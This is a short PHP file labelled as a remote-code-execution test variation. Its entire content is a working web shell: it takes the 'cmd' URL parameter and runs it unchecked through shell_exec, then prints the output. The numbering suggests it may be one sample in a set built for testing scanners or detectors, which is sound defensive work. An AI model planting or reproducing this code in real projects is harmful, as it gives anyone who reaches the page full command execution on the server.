<?php
// RCE test variation #1089
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>